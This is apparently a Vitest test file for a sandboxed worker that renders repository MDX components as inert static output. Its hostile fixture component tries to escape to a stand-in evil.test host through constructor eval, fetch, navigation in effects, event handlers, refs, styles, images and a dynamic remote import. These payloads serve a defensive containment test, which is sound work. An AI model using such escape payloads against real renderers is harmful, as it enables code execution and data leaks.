// @vitest-environment node
import vm from "node:vm"
import { describe, expect, it } from "vitest"
import {
  createCompatibleWorkerRenderer,
  createCompatibleWorkerSource,
  prepareCompatibleWorkerJob,
} from "../compatible-worker"

describe("compatible worker containment", () => {
  it("runs repository components without a DOM/navigation realm and returns only inert output", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-hostile",
      documentSource: "<Escape />",
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import React from "react"
            function Escape() {
              React.useEffect(() => { globalThis.location.href = "https://evil.test/effect" }, [])
              React.useLayoutEffect(() => {}, [])
              React.useState(0)
              React.useReducer((value) => value, 0)
              React.useRef(null)
              const constructor = (() => {}).constructor
              if (constructor) constructor("globalThis.location.href='https://evil.test/constructor'")()
              const asyncConstructor = Object.getPrototypeOf(async function () {}).constructor
              if (asyncConstructor) asyncConstructor("globalThis.location.href='https://evil.test/async-constructor'")()
              if (typeof postMessage === "function") postMessage({ type: "repopress:rendered-compatible" })
              if (typeof fetch === "function") fetch("https://evil.test/fetch")
              return <a
                href="https://evil.test/link"
                style={{ backgroundImage: "url(https://evil.test/style)" }}
                onClick={() => { globalThis.location.href = "https://evil.test/event" }}
                ref={() => { globalThis.location.href = "https://evil.test/ref" }}
              ><img src="https://evil.test/image" />Contained</a>
            }
            export default { components: { Escape } }
          `,
        },
      },
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const workerLocation = { href: "blob:null/repopress-owned-worker" }
    const port = {
      closed: false,
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {
        this.closed = true
      },
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      console,
      location: workerLocation,
      addEventListener: (
        type: string,
        listener: (event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>,
      ) => {
        if (type === "message") listeners.push(listener)
      },
      removeEventListener: () => {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })

    expect(listeners).toHaveLength(1)
    await listeners[0]({ ports: [port] })
    expect(port.onmessage).not.toBeNull()
    port.onmessage?.({
      data: {
        type: "repopress:render-compatible",
        requestId: "R".repeat(43),
        job,
      },
    })

    expect(workerLocation.href).toBe("blob:null/repopress-owned-worker")
    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({ type: "repopress:rendered-compatible", requestId: "R".repeat(43) })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("Contained")
    expect(serialized).not.toMatch(/evil\.test|href|style|ref/)
    expect(sent[0]).toMatchObject({
      fidelityLosses: expect.arrayContaining([
        "STATIC_INERT_EFFECT",
        "STATIC_INERT_LAYOUT_EFFECT",
        "STATIC_INERT_STATE",
        "STATIC_INERT_REDUCER",
        "STATIC_INERT_REF",
        "STATIC_INERT_EVENT",
        "STATIC_INERT_LINK",
        "STATIC_INERT_MEDIA",
        "STATIC_INERT_STYLE",
      ]),
    })
  })

  it("reports timeout and worker errors with closed bounded pipeline codes", async () => {
    const job = await prepareCompatibleWorkerJob({ artifactId: "artifact", documentSource: "# Static", adapter: null })
    const unresponsivePort = {
      onmessage: null as ((event: MessageEvent) => void) | null,
      close() {},
      postMessage() {},
      start() {},
    }
    const timeoutRenderer = createCompatibleWorkerRenderer({
      createWorker: () => ({ postMessage() {}, terminate() {} }),
      createMessageChannel: () => ({ port1: unresponsivePort, port2: {} as Transferable }),
      createRequestId: () => "T".repeat(43),
      timeoutMs: 1,
    })
    await expect(timeoutRenderer.render(job)).rejects.toMatchObject({ code: "COMPATIBLE_WORKER_TIMEOUT" })

    const errorPort = {
      onmessage: null as ((event: MessageEvent) => void) | null,
      close() {},
      postMessage() {
        this.onmessage?.({
          data: {
            type: "repopress:compatible-error",
            requestId: "E".repeat(43),
            code: "COMPATIBLE_EXECUTION_FAILED",
          },
        } as MessageEvent)
      },
      start() {},
    }
    const errorRenderer = createCompatibleWorkerRenderer({
      createWorker: () => ({ postMessage() {}, terminate() {} }),
      createMessageChannel: () => ({ port1: errorPort, port2: {} as Transferable }),
      createRequestId: () => "E".repeat(43),
    })
    await expect(errorRenderer.render(job)).rejects.toMatchObject({ code: "COMPATIBLE_EXECUTION_FAILED" })
  })

  it("rejects dynamic imports before any repository code reaches the worker", async () => {
    await expect(
      prepareCompatibleWorkerJob({
        artifactId: "artifact-import",
        documentSource: "# Safe",
        adapter: {
          entryPath: "mdx-preview.tsx",
          sources: {
            "mdx-preview.tsx": `
              const deferred = import("https://evil.test/module.js")
              export default { scope: { deferred } }
            `,
          },
        },
      }),
    ).rejects.toThrow("Dynamic imports are unavailable")
  })

  it("keeps ordinary supported semantic static content lossless", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-static",
      documentSource: "# Static heading\n\nA supported paragraph.",
      adapter: null,
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const port = {
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {},
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      addEventListener: (_type: string, listener: (event: { data?: unknown; ports?: unknown[] }) => void) =>
        listeners.push(listener),
      removeEventListener() {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })
    await listeners[0]({ ports: [port] })
    port.onmessage?.({
      data: { type: "repopress:render-compatible", requestId: "S".repeat(43), job },
    })

    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({
      type: "repopress:rendered-compatible",
      fidelityLosses: [],
      tree: expect.arrayContaining([expect.objectContaining({ kind: "element", tag: "h1" })]),
    })
  })
})
